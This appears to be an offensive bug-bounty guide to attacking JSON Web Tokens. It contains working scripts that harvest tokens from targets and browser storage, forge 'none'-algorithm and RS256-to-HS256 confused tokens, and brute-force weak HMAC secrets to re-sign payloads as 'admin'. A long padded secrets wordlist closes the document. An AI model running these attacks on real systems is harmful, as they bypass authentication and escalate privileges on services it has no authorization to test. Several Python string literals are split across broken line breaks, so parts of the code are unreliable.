# 🔥 JWT Token Manipulation & Cracking - Elite Edition

## 💰 High-Value Exploitation ($1000+ Bugs)

### 🎯 Target: JSON Web Tokens (JWT) & Authentication Systems

---

## 🛠️ Phase 1: JWT Discovery & Collection

### JWT Token Discovery

```bash
#!/bin/bash
# JWT Token Discovery Script
TARGET=$1

echo "🔍 Discovering JWT tokens on $TARGET"

# Create output directory
OUTPUT_DIR="jwt_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR/{tokens,cracked,analysis,wordlists}

# Method 1: Extract from HTTP responses
echo "📡 Extracting JWT tokens from HTTP responses..."
curl -s "$TARGET" -c cookies.txt | grep -oE "eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*" > $OUTPUT_DIR/tokens/http_tokens.txt

# Method 2: Extract from JavaScript files
echo "🔍 Searching JavaScript files for JWT tokens..."
echo $TARGET | katana -js-crawl -silent | while read js_url; do
    curl -s "$js_url" | grep -oE "eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*" >> $OUTPUT_DIR/tokens/js_tokens.txt
done

# Method 3: Extract from localStorage/sessionStorage (via XSS or browser)
echo "💾 Checking for tokens in browser storage..."
cat > $OUTPUT_DIR/extract_storage_tokens.js << 'EOF'
// Run this in browser console to extract JWT tokens
function extractJWTTokens() {
    const tokens = [];
    
    // Check localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        if (value && value.match(/^eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*$/)) {
            tokens.push({source: 'localStorage', key: key, token: value});
        }
    }
    
    // Check sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        if (value && value.match(/^eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*$/)) {
            tokens.push({source: 'sessionStorage', key: key, token: value});
        }
    }
    
    // Check cookies
    document.cookie.split(';').forEach(cookie => {
        const [key, value] = cookie.trim().split('=');
        if (value && value.match(/^eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*$/)) {
            tokens.push({source: 'cookie', key: key, token: value});
        }
    });
    
    return tokens;
}

console.log('JWT Tokens found:', extractJWTTokens());
EOF

# Method 4: Burp Suite history extraction (if available)
echo "🕷️ Extracting from Burp Suite history..."
if [ -f "burp_history.xml" ]; then
    grep -oE "eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*" burp_history.xml >> $OUTPUT_DIR/tokens/burp_tokens.txt
fi

# Method 5: Mobile app analysis (if APK available)
echo "📱 Checking mobile app for JWT tokens..."
if [ -f "app.apk" ]; then
    unzip -q app.apk -d temp_apk/
    find temp_apk/ -name "*.js" -o -name "*.json" -o -name "*.xml" | xargs grep -oE "eyJ[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_=]*\.[A-Za-z0-9\-_.+/=]*" >> $OUTPUT_DIR/tokens/mobile_tokens.txt
    rm -rf temp_apk/
fi

# Combine all tokens and remove duplicates
cat $OUTPUT_DIR/tokens/*.txt 2>/dev/null | sort -u > $OUTPUT_DIR/tokens/all_tokens.txt

echo "✅ Found $(wc -l < $OUTPUT_DIR/tokens/all_tokens.txt) unique JWT tokens"
```

### JWT Token Analysis & Decoding

```bash
#!/bin/bash
# JWT Token Analysis Script
TOKENS_FILE=$1
OUTPUT_DIR=$2

echo "🔍 Analyzing JWT tokens..."

# Create JWT analysis script
python3 << 'EOF'
import base64
import json
import sys
import hashlib
import hmac
from datetime import datetime
import re

def decode_jwt_part(part):
    """Decode JWT part with proper padding"""
    # Add padding if needed
    missing_padding = len(part) % 4
    if missing_padding:
        part += '=' * (4 - missing_padding)
    
    try:
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded.decode('utf-8'))
    except Exception as e:
        return {"error": str(e), "raw": part}

def analyze_jwt_token(token):
    """Comprehensive JWT token analysis"""
    parts = token.split('.')
    
    if len(parts) != 3:
        return {"error": "Invalid JWT format", "token": token}
    
    header_raw, payload_raw, signature_raw = parts
    
    # Decode header and payload
    header = decode_jwt_part(header_raw)
    payload = decode_jwt_part(payload_raw)
    
    analysis = {
        "token": token,
        "header": header,
        "payload": payload,
        "signature": signature_raw,
        "vulnerabilities": [],
        "security_issues": [],
        "recommendations": []
    }
    
    # Security analysis
    if isinstance(header, dict):
        # Check algorithm
        alg = header.get('alg', 'unknown')
        analysis['algorithm'] = alg
        
        if alg == 'none':
            analysis['vulnerabilities'].append("CRITICAL: Algorithm set to 'none' - signature bypass possible")
        elif alg.startswith('HS'):
            analysis['security_issues'].append(f"Uses HMAC algorithm ({alg}) - vulnerable to brute force")
        elif alg.startswith('RS'):
            analysis['security_issues'].append(f"Uses RSA algorithm ({alg}) - check for key confusion attacks")
        
        # Check for algorithm confusion vulnerabilities
        if 'kid' in header:
            analysis['security_issues'].append("Key ID (kid) present - check for path traversal/injection")
        
        if 'jku' in header:
            analysis['vulnerabilities'].append("CRITICAL: JWK Set URL (jku) present - URL manipulation possible")
        
        if 'x5u' in header:
            analysis['vulnerabilities'].append("HIGH: X.509 URL (x5u) present - certificate injection possible")
    
    if isinstance(payload, dict):
        # Check expiration
        if 'exp' in payload:
            exp_time = datetime.fromtimestamp(payload['exp'])
            current_time = datetime.now()
            if exp_time < current_time:
                analysis['security_issues'].append(f"Token expired on {exp_time}")
            else:
                analysis['security_issues'].append(f"Token expires on {exp_time}")
        else:
            analysis['vulnerabilities'].append("HIGH: No expiration time (exp) - token never expires")
        
        # Check issued at
        if 'iat' in payload:
            iat_time = datetime.fromtimestamp(payload['iat'])
            analysis['security_issues'].append(f"Token issued at {iat_time}")
        
        # Check not before
        if 'nbf' in payload:
            nbf_time = datetime.fromtimestamp(payload['nbf'])
            if nbf_time > datetime.now():
                analysis['security_issues'].append(f"Token not valid before {nbf_time}")
        
        # Check for sensitive information
        sensitive_keys = ['password', 'secret', 'key', 'token', 'api_key', 'private']
        for key in payload.keys():
            if any(sensitive in key.lower() for sensitive in sensitive_keys):
                analysis['vulnerabilities'].append(f"MEDIUM: Sensitive information in payload: {key}")
        
        # Check user roles/permissions
        if 'role' in payload or 'roles' in payload or 'permissions' in payload:
            analysis['security_issues'].append("Role/permission information present - check for privilege escalation")
        
        # Check for admin indicators
        admin_indicators = ['admin', 'administrator', 'root', 'superuser']
        payload_str = json.dumps(payload).lower()
        for indicator in admin_indicators:
            if indicator in payload_str:
                analysis['vulnerabilities'].append(f"HIGH: Admin indicator found: {indicator}")
    
    # Generate recommendations
    if analysis['vulnerabilities']:
        analysis['recommendations'].append("Immediate security review required due to critical vulnerabilities")
    
    if alg in ['HS256', 'HS384', 'HS512']:
        analysis['recommendations'].append("Consider using RSA/ECDSA algorithms for better security")
    
    if 'exp' not in payload:
        analysis['recommendations'].append("Add expiration time (exp) to prevent token reuse")
    
    return analysis

# Process tokens
tokens_file = sys.argv[1] if len(sys.argv) > 1 else 'tokens/all_tokens.txt'
output_dir = sys.argv[2] if len(sys.argv) > 2 else 'analysis'

try:
    with open(tokens_file, 'r') as f:
        tokens = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("Tokens file not found")
    sys.exit(1)

all_analyses = []
critical_vulns = 0
high_vulns = 0

for i, token in enumerate(tokens):
    print(f"Analyzing token {i+1}/{len(tokens)}")
    analysis = analyze_jwt_token(token)
    all_analyses.append(analysis)
    
    # Count vulnerabilities
    for vuln in analysis.get('vulnerabilities', []):
        if 'CRITICAL' in vuln:
            critical_vulns += 1
        elif 'HIGH' in vuln:
            high_vulns += 1

# Save detailed analysis
with open(f"{output_dir}/jwt_analysis.json", 'w') as f:
    json.dump(all_analyses, f, indent=2, default=str)

# Generate summary report
with open(f"{output_dir}/jwt_summary.txt", 'w') as f:
    f.write("🔍 JWT Token Analysis Summary
")
    f.write("=" * 40 + "

")
    f.write(f"Total tokens analyzed: {len(tokens)}
")
    f.write(f"Critical vulnerabilities: {critical_vulns}
")
    f.write(f"High vulnerabilities: {high_vulns}

")
    
    # Algorithm distribution
    algorithms = {}
    for analysis in all_analyses:
        alg = analysis.get('algorithm', 'unknown')
        algorithms[alg] = algorithms.get(alg, 0) + 1
    
    f.write("Algorithm Distribution:
")
    for alg, count in algorithms.items():
        f.write(f"  {alg}: {count}
")
    f.write("
")
    
    # Top vulnerabilities
    all_vulns = []
    for analysis in all_analyses:
        all_vulns.extend(analysis.get('vulnerabilities', []))
    
    if all_vulns:
        f.write("Top Vulnerabilities:
")
        vuln_counts = {}
        for vuln in all_vulns:
            vuln_type = vuln.split(':')[0] if ':' in vuln else vuln
            vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
        
        for vuln, count in sorted(vuln_counts.items(), key=lambda x: x[1], reverse=True):
            f.write(f"  {vuln}: {count} occurrences
")

print(f"✅ JWT analysis completed: {critical_vulns} critical, {high_vulns} high vulnerabilities")
EOF
```

---

## 🔥 Phase 2: JWT Vulnerability Exploitation

### Algorithm Confusion Attacks

```bash
#!/bin/bash
# JWT Algorithm Confusion Attack Script
ORIGINAL_TOKEN=$1
TARGET_URL=$2

echo "🔄 Testing JWT algorithm confusion attacks..."

# Create algorithm confusion testing script
python3 << 'EOF'
import base64
import json
import sys
import requests
import hmac
import hashlib
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization

def decode_jwt_part(part):
    """Decode JWT part with proper padding"""
    missing_padding = len(part) % 4
    if missing_padding:
        part += '=' * (4 - missing_padding)
    
    try:
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded.decode('utf-8'))
    except:
        return None

def encode_jwt_part(data):
    """Encode data to JWT part"""
    json_str = json.dumps(data, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.rstrip('=')

def test_none_algorithm(token, target_url):
    """Test 'none' algorithm bypass"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Modify algorithm to 'none'
    header['alg'] = 'none'
    
    # Create new token without signature
    new_header = encode_jwt_part(header)
    new_payload = encode_jwt_part(payload)
    new_token = f"{new_header}.{new_payload}."
    
    print(f"Testing 'none' algorithm bypass...")
    print(f"Original: {token[:50]}...")
    print(f"Modified: {new_token[:50]}...")
    
    # Test the token
    try:
        response = requests.get(target_url, 
                              headers={'Authorization': f'Bearer {new_token}'},
                              timeout=10)
        
        if response.status_code == 200:
            return {
                'attack': 'none_algorithm',
                'success': True,
                'token': new_token,
                'response_code': response.status_code,
                'response_length': len(response.text)
            }
    except Exception as e:
        print(f"Error testing none algorithm: {e}")
    
    return {'attack': 'none_algorithm', 'success': False}

def test_algorithm_confusion_rs256_to_hs256(token, target_url, public_key_pem=None):
    """Test RS256 to HS256 algorithm confusion"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Change algorithm from RS256 to HS256
    if header.get('alg') != 'RS256':
        return {'attack': 'rs256_to_hs256', 'success': False, 'reason': 'Not RS256 token'}
    
    header['alg'] = 'HS256'
    
    # If we have a public key, use it as HMAC secret
    if public_key_pem:
        try:
            # Create new token with HS256 using public key as secret
            new_header = encode_jwt_part(header)
            new_payload = encode_jwt_part(payload)
            
            message = f"{new_header}.{new_payload}"
            signature = hmac.new(
                public_key_pem.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            new_token = f"{message}.{signature_b64}"
            
            print(f"Testing RS256->HS256 confusion...")
            print(f"New token: {new_token[:50]}...")
            
            # Test the token
            response = requests.get(target_url,
                                  headers={'Authorization': f'Bearer {new_token}'},
                                  timeout=10)
            
            if response.status_code == 200:
                return {
                    'attack': 'rs256_to_hs256',
                    'success': True,
                    'token': new_token,
                    'response_code': response.status_code
                }
        except Exception as e:
            print(f"Error in RS256->HS256 attack: {e}")
    
    return {'attack': 'rs256_to_hs256', 'success': False}

def test_weak_secret_hs256(token, target_url):
    """Test weak secret brute force for HS256"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload or header.get('alg') not in ['HS256', 'HS384', 'HS512']:
        return {'attack': 'weak_secret', 'success': False, 'reason': 'Not HMAC algorithm'}
    
    # Common weak secrets
    weak_secrets = [
        'secret', 'password', '123456', 'admin', 'test', 'key',
        'jwt_secret', 'your-256-bit-secret', 'mysecret', 'secretkey',
        '', 'null', 'undefined', 'secret123', 'password123'
    ]
    
    algorithm = header['alg']
    hash_func = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512
    }.get(algorithm, hashlib.sha256)
    
    message = f"{parts[0]}.{parts[1]}"
    original_signature = parts[2]
    
    print(f"Testing weak secrets for {algorithm}...")
    
    for secret in weak_secrets:
        try:
            # Calculate signature with weak secret
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()
            
            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            if signature_b64 == original_signature:
                print(f"✅ WEAK SECRET FOUND: '{secret}'")
                
                # Create a modified token to test
                payload['user'] = 'admin'  # Try privilege escalation
                new_payload = encode_jwt_part(payload)
                new_message = f"{parts[0]}.{new_payload}"
                
                new_signature = hmac.new(
                    secret.encode(),
                    new_message.encode(),
                    hash_func
                ).digest()
                
                new_signature_b64 = base64.urlsafe_b64encode(new_signature).decode().rstrip('=')
                new_token = f"{new_message}.{new_signature_b64}"
                
                return {
                    'attack': 'weak_secret',
                    'success': True,
                    'secret': secret,
                    'original_token': token,
                    'modified_token': new_token
                }
        except Exception as e:
            continue
    
    return {'attack': 'weak_secret', 'success': False}

# Main execution
if len(sys.argv) < 3:
    print("Usage: python3 script.py <jwt_token> <target_url>")
    sys.exit(1)

token = sys.argv[1]
target_url = sys.argv[2]

results = []

# Test 1: None algorithm bypass
result1 = test_none_algorithm(token, target_url)
if result1:
    results.append(result1)

# Test 2: Weak secret brute force
result2 = test_weak_secret_hs256(token, target_url)
if result2:
    results.append(result2)

# Test 3: Algorithm confusion (requires public key)
# This would need the public key from the server
# result3 = test_algorithm_confusion_rs256_to_hs256(token, target_url, public_key)

# Save results
with open('algorithm_confusion_results.json', 'w') as f:
    json.dump(results, f, indent=2)

successful_attacks = [r for r in results if r.get('success')]
print(f"
✅ Algorithm confusion testing completed")
print(f"Successful attacks: {len(successful_attacks)}")

for attack in successful_attacks:
    print(f"  - {attack['attack']}: SUCCESS")
    if 'token' in attack:
        print(f"    New token: {attack['token'][:50]}...")
EOF
```

### JWT Secret Brute Force

```bash
#!/bin/bash
# JWT Secret Brute Force Script
JWT_TOKEN=$1

echo "🔓 Brute forcing JWT secret..."

# Create comprehensive wordlist
echo "📝 Creating JWT secret wordlist..."
cat > jwt_secrets.txt << 'EOF'
secret
password
123456
admin
test
key
jwt_secret
your-256-bit-secret
mysecret
secretkey
secret123
password123
admin123
test123
key123
jwt
token
auth
authentication
authorization
api_key
private_key
signing_key
hmac_secret
shared_secret
app_secret
application_secret
server_secret
client_secret
session_secret
cookie_secret
csrf_secret
xsrf_secret
security_key
encryption_key
decryption_key
signature_key
verification_key
validation_key
access_token
refresh_token
bearer_token
api_token
auth_token
session_token
login_token
user_token
admin_token
guest_token
public_token
private_token
internal_token
external_token
development_secret
production_secret
staging_secret
testing_secret
debug_secret
release_secret
master_secret
main_secret
default_secret
config_secret
settings_secret
environment_secret
system_secret
platform_secret
service_secret
microservice_secret
backend_secret
frontend_secret
database_secret
cache_secret
redis_secret
mongodb_secret
mysql_secret
postgresql_secret
sqlite_secret
elasticsearch_secret
rabbitmq_secret
kafka_secret
docker_secret
kubernetes_secret
aws_secret
azure_secret
gcp_secret
github_secret
gitlab_secret
bitbucket_secret
jenkins_secret
travis_secret
circleci_secret
heroku_secret
netlify_secret
vercel_secret
firebase_secret
supabase_secret
stripe_secret
paypal_secret
twilio_secret
sendgrid_secret
mailgun_secret
slack_secret
discord_secret
telegram_secret
whatsapp_secret
facebook_secret
google_secret
twitter_secret
linkedin_secret
instagram_secret
tiktok_secret
snapchat_secret
pinterest_secret
reddit_secret
youtube_secret
vimeo_secret
spotify_secret
apple_secret
microsoft_secret
amazon_secret
netflix_secret
uber_secret
airbnb_secret
booking_secret
expedia_secret
trivago_secret
EOF

# Add common passwords
cat >> jwt_secrets.txt << 'EOF'
password
123456
12345678
qwerty
abc123
password123
admin
letmein
welcome
monkey
dragon
master
shadow
superman
batman
football
baseball
basketball
soccer
tennis
golf
hockey
swimming
running
cycling
hiking
camping
fishing
hunting
cooking
reading
writing
drawing
painting
singing
dancing
music
movies
games
travel
vacation
holiday
birthday
christmas
halloween
thanksgiving
newyear
valentine
easter
summer
winter
spring
autumn
january
february
march
april
may
june
july
august
september
october
november
december
monday
tuesday
wednesday
thursday
friday
saturday
sunday
morning
afternoon
evening
night
today
tomorrow
yesterday
week
month
year
time
date
clock
calendar
schedule
meeting
appointment
conference
presentation
project
task
work
job
career
business
company
organization
team
group
family
friend
love
life
home
house
car
phone
computer
laptop
tablet
mobile
internet
website
email
social
network
online
offline
digital
technology
software
hardware
application
program
system
platform
framework
library
database
server
client
user
customer
guest
visitor
member
subscriber
follower
fan
supporter
partner
sponsor
investor
founder
owner
manager
director
ceo
cto
cfo
cmo
coo
vp
president
chairman
board
executive
employee
staff
worker
developer
programmer
engineer
designer
analyst
consultant
advisor
expert
specialist
professional
freelancer
contractor
intern
student
teacher
professor
doctor
nurse
lawyer
accountant
architect
artist
writer
journalist
photographer
videographer
musician
singer
actor
actress
model
athlete
coach
trainer
chef
waiter
bartender
driver
pilot
captain
soldier
police
firefighter
paramedic
scientist
researcher
inventor
entrepreneur
investor
trader
banker
broker
agent
salesperson
marketer
advertiser
publicist
recruiter
hr
finance
accounting
legal
marketing
sales
support
service
quality
security
safety
privacy
compliance
audit
risk
insurance
healthcare
education
government
nonprofit
charity
volunteer
community
society
culture
religion
politics
economy
environment
climate
weather
nature
animal
plant
food
drink
restaurant
hotel
travel
transport
vehicle
fuel
energy
electricity
water
gas
oil
coal
solar
wind
nuclear
renewable
sustainable
green
eco
organic
natural
healthy
fitness
exercise
sport
game
entertainment
fun
hobby
interest
passion
dream
goal
plan
strategy
tactic
method
approach
solution
problem
challenge
opportunity
success
failure
win
lose
good
bad
best
worst
big
small
large
tiny
huge
massive
giant
mini
micro
macro
fast
slow
quick
rapid
instant
immediate
urgent
important
critical
essential
necessary
optional
extra
bonus
premium
standard
basic
simple
complex
easy
hard
difficult
impossible
possible
probable
likely
unlikely
certain
uncertain
sure
unsure
confident
doubtful
positive
negative
optimistic
pessimistic
happy
sad
excited
bored
interested
curious
surprised
shocked
amazed
confused
clear
unclear
obvious
hidden
visible
invisible
public
private
open
closed
free
paid
cheap
expensive
valuable
worthless
useful
useless
helpful
harmful
safe
dangerous
secure
insecure
stable
unstable
reliable
unreliable
consistent
inconsistent
regular
irregular
normal
abnormal
typical
unusual
common
rare
popular
unpopular
famous
unknown
new
old
fresh
stale
modern
ancient
current
outdated
latest
earliest
first
last
beginning
end
start
finish
continue
stop
pause
resume
play
record
save
load
create
delete
update
modify
change
edit
copy
paste
cut
move
drag
drop
click
tap
touch
swipe
scroll
zoom
rotate
flip
turn
spin
shake
vibrate
ring
buzz
beep
sound
noise
music
voice
speech
talk
speak
say
tell
ask
answer
question
reply
response
message
text
email
call
video
photo
image
picture
graphic
icon
symbol
logo
brand
name
title
label
tag
category
type
kind
sort
group
class
level
grade
rank
score
point
number
count
amount
quantity
size
length
width
height
depth
weight
mass
volume
area
distance
speed
time
duration
period
interval
frequency
rate
ratio
percentage
fraction
decimal
integer
float
string
boolean
array
object
function
method
property
attribute
parameter
argument
variable
constant
value
data
information
knowledge
wisdom
intelligence
smart
clever
brilliant
genius
talent
skill
ability
capability
capacity
potential
power
strength
weakness
advantage
disadvantage
benefit
cost
price
value
worth
quality
quantity
performance
efficiency
effectiveness
productivity
profitability
sustainability
scalability
flexibility
adaptability
reliability
availability
accessibility
usability
compatibility
interoperability
portability
maintainability
testability
debuggability
readability
understandability
simplicity
complexity
elegance
beauty
aesthetics
design
style
fashion
trend
pattern
template
framework
structure
architecture
infrastructure
foundation
base
core
center
middle
edge
border
boundary
limit
range
scope
scale
dimension
aspect
feature
characteristic
trait
quality
property
attribute
element
component
part
piece
section
segment
division
category
group
set
collection
list
array
sequence
series
chain
link
connection
relationship
association
correlation
dependency
requirement
specification
standard
guideline
rule
policy
procedure
process
workflow
pipeline
lifecycle
methodology
approach
strategy
tactic
technique
method
tool
instrument
device
equipment
machine
system
platform
environment
context
situation
condition
state
status
position
location
place
space
room
area
region
zone
territory
country
city
town
village
neighborhood
community
society
culture
civilization
world
universe
galaxy
planet
earth
moon
sun
star
sky
cloud
rain
snow
wind
storm
weather
climate
season
temperature
heat
cold
fire
water
air
earth
metal
wood
stone
rock
sand
soil
grass
tree
flower
plant
animal
bird
fish
insect
human
person
people
man
woman
child
baby
adult
teenager
senior
elder
youth
age
birth
death
life
health
disease
medicine
doctor
hospital
clinic
pharmacy
drug
treatment
therapy
surgery
operation
examination
test
diagnosis
symptom
pain
injury
accident
emergency
ambulance
police
fire
rescue
help
support
assistance
service
care
love
hate
like
dislike
prefer
choose
select
pick
decide
determine
judge
evaluate
assess
measure
calculate
compute
estimate
guess
predict
forecast
plan
prepare
organize
arrange
schedule
book
reserve
order
buy
sell
trade
exchange
give
take
receive
send
deliver
transport
carry
move
travel
visit
go
come
arrive
leave
stay
remain
wait
hurry
rush
slow
fast
quick
rapid
instant
immediate
soon
later
early
late
before
after
during
while
when
where
what
who
why
how
which
that
this
these
those
all
some
many
few
several
various
different
same
similar
equal
unequal
more
less
most
least
better
worse
best
worst
good
bad
great
terrible
excellent
awful
amazing
boring
interesting
exciting
surprising
shocking
confusing
clear
obvious
hidden
secret
public
private
personal
professional
business
work
job
career
money
cash
dollar
euro
pound
yen
bitcoin
crypto
blockchain
nft
defi
web3
metaverse
ai
ml
iot
ar
vr
5g
cloud
edge
quantum
nano
bio
gene
dna
rna
protein
cell
virus
bacteria
vaccine
immunity
health
fitness
nutrition
diet
exercise
sport
game
play
fun
entertainment
movie
film
tv
show
series
episode
season
actor
actress
director
producer
writer
script
story
plot
character
hero
villain
comedy
drama
action
adventure
thriller
horror
romance
fantasy
scifi
documentary
news
report
article
blog
post
comment
review
rating
star
like
share
follow
subscribe
notification
alert
message
chat
call
video
audio
voice
text
email
sms
push
popup
banner
ad
advertisement
marketing
promotion
campaign
brand
logo
slogan
tagline
motto
mission
vision
value
goal
objective
target
kpi
metric
analytics
data
insight
trend
pattern
behavior
preference
choice
decision
action
reaction
response
feedback
survey
poll
vote
election
democracy
government
politics
law
rule
regulation
policy
compliance
audit
risk
security
privacy
protection
safety
insurance
warranty
guarantee
promise
commitment
agreement
contract
deal
negotiation
partnership
collaboration
teamwork
leadership
management
strategy
planning
execution
implementation
monitoring
evaluation
improvement
optimization
innovation
creativity
invention
discovery
research
development
testing
validation
verification
certification
accreditation
license
permit
approval
authorization
authentication
identification
verification
validation
confirmation
proof
evidence
fact
truth
reality
fiction
myth
legend
story
tale
history
past
present
future
time
space
dimension
universe
multiverse
parallel
alternative
virtual
digital
analog
binary
quantum
classical
modern
traditional
ancient
old
new
fresh
stale
hot
cold
warm
cool
dry
wet
solid
liquid
gas
plasma
matter
energy
force
power
strength
weakness
light
dark
bright
dim
color
black
white
red
green
blue
yellow
orange
purple
pink
brown
gray
silver
gold
copper
iron
steel
aluminum
plastic
glass
wood
paper
fabric
leather
rubber
metal
stone
concrete
brick
tile
paint
ink
oil
water
milk
juice
coffee
tea
beer
wine
whiskey
vodka
rum
gin
tequila
champagne
soda
cola
pepsi
coke
sprite
fanta
juice
smoothie
shake
cocktail
mocktail
drink
beverage
food
meal
breakfast
lunch
dinner
snack
dessert
cake
cookie
pie
bread
rice
pasta
pizza
burger
sandwich
salad
soup
stew
curry
sauce
spice
salt
pepper
sugar
honey
syrup
jam
jelly
butter
cheese
milk
cream
yogurt
ice
cream
chocolate
candy
sweet
sour
bitter
salty
spicy
hot
mild
fresh
rotten
delicious
tasty
yummy
gross
disgusting
healthy
unhealthy
organic
natural
artificial
synthetic
processed
raw
cooked
baked
fried
grilled
boiled
steamed
roasted
smoked
pickled
fermented
aged
mature
young
old
new
vintage
classic
retro
modern
contemporary
futuristic
traditional
conventional
unconventional
normal
abnormal
regular
irregular
standard
custom
unique
common
rare
special
ordinary
extraordinary
simple
complex
easy
hard
difficult
challenging
impossible
possible
probable
likely
unlikely
certain
uncertain
sure
unsure
confident
doubtful
optimistic
pessimistic
positive
negative
good
bad
great
terrible
excellent
poor
high
low
big
small
large
tiny
huge
massive
giant
mini
long
short
tall
wide
narrow
thick
thin
heavy
light
strong
weak
hard
soft
rough
smooth
sharp
dull
bright
dark
loud
quiet
fast
slow
hot
cold
warm
cool
dry
wet
clean
dirty
new
old
young
fresh
stale
alive
dead
active
passive
busy
idle
full
empty
open
closed
public
private
free
paid
cheap
expensive
rich
poor
happy
sad
angry
calm
excited
bored
tired
energetic
healthy
sick
safe
dangerous
lucky
unlucky
smart
stupid
wise
foolish
brave
coward
honest
dishonest
kind
cruel
generous
selfish
patient
impatient
polite
rude
friendly
hostile
helpful
useless
important
trivial
serious
funny
boring
interesting
exciting
surprising
expected
unexpected
known
unknown
famous
anonymous
popular
unpopular
successful
unsuccessful
winner
loser
leader
follower
teacher
student
parent
child
friend
enemy
neighbor
stranger
guest
host
client
server
buyer
seller
employer
employee
boss
worker
manager
staff
team
group
family
couple
single
married
divorced
widowed
bachelor
spinster
male
female
man
woman
boy
girl
baby
toddler
child
teenager
adult
senior
elder
human
person
people
individual
citizen
resident
native
foreigner
tourist
visitor
traveler
passenger
driver
pilot
captain
sailor
soldier
officer
general
admiral
president
minister
mayor
governor
senator
congressman
judge
lawyer
doctor
nurse
teacher
professor
student
researcher
scientist
engineer
architect
designer
artist
writer
journalist
photographer
musician
singer
dancer
actor
actress
model
athlete
coach
chef
waiter
bartender
cashier
clerk
secretary
assistant
manager
director
ceo
cto
cfo
cmo
coo
vp
president
chairman
founder
owner
partner
investor
shareholder
stakeholder
customer
client
user
member
subscriber
follower
fan
supporter
volunteer
donor
sponsor
advertiser
marketer
salesperson
recruiter
consultant
advisor
expert
specialist
professional
amateur
beginner
novice
intermediate
advanced
expert
master
guru
legend
icon
celebrity
star
hero
champion
winner
loser
failure
success
achievement
accomplishment
goal
dream
wish
hope
fear
worry
concern
problem
issue
challenge
opportunity
solution
answer
question
mystery
secret
surprise
gift
present
reward
prize
award
medal
trophy
certificate
diploma
degree
qualification
skill
talent
ability
capability
experience
knowledge
wisdom
intelligence
creativity
imagination
innovation
invention
discovery
breakthrough
progress
development
growth
improvement
change
transformation
evolution
revolution
reform
update
upgrade
enhancement
optimization
efficiency
effectiveness
productivity
performance
quality
excellence
perfection
standard
benchmark
target
goal
objective
purpose
mission
vision
strategy
plan
tactic
method
approach
technique
procedure
process
system
framework
structure
model
template
pattern
design
architecture
blueprint
specification
requirement
feature
function
capability
service
product
solution
tool
instrument
device
equipment
machine
technology
software
hardware
application
program
system
platform
network
internet
web
website
portal
blog
forum
social
media
channel
stream
feed
timeline
post
article
content
information
data
knowledge
news
update
announcement
notification
alert
message
email
text
chat
call
video
audio
image
photo
picture
graphic
icon
symbol
logo
brand
trademark
copyright
patent
license
permission
authorization
authentication
verification
validation
confirmation
approval
acceptance
rejection
denial
refusal
agreement
disagreement
contract
deal
transaction
payment
purchase
sale
order
delivery
shipping
logistics
supply
demand
market
economy
business
commerce
trade
industry
sector
company
corporation
organization
institution
agency
department
division
unit
team
group
committee
board
council
assembly
parliament
government
administration
authority
power
control
management
leadership
governance
regulation
law
rule
policy
procedure
guideline
standard
protocol
convention
tradition
custom
culture
society
community
population
demographic
generation
age
gender
race
ethnicity
nationality
religion
belief
faith
philosophy
ideology
politics
economics
sociology
psychology
anthropology
history
geography
science
mathematics
physics
chemistry
biology
medicine
engineering
technology
computer
internet
software
hardware
programming
coding
development
design
testing
debugging
deployment
maintenance
support
documentation
training
education
learning
teaching
instruction
guidance
advice
consultation
counseling
therapy
treatment
healing
recovery
rehabilitation
prevention
protection
security
safety
privacy
confidentiality
transparency
accountability
responsibility
liability
insurance
warranty
guarantee
quality
assurance
control
monitoring
evaluation
assessment
measurement
analysis
research
investigation
study
experiment
test
trial
survey
poll
interview
observation
inspection
audit
review
examination
check
verification
validation
confirmation
certification
accreditation
approval
authorization
permission
license
permit
registration
subscription
membership
enrollment
admission
acceptance
selection
recruitment
hiring
employment
job
work
career
profession
occupation
trade
craft
skill
expertise
experience
qualification
education
training
development
improvement
growth
progress
advancement
promotion
success
achievement
accomplishment
recognition
reward
compensation
salary
wage
income
profit
revenue
earnings
investment
return
dividend
interest
bonus
commission
fee
cost
expense
budget
finance
accounting
economics
business
commerce
trade
market
industry
sector
company
organization
institution
government
politics
law
regulation
policy
society
culture
community
family
relationship
friendship
love
marriage
partnership
collaboration
cooperation
competition
conflict
war
peace
harmony
balance
stability
security
safety
health
wellness
fitness
nutrition
diet
exercise
sport
recreation
entertainment
fun
hobby
interest
passion
dream
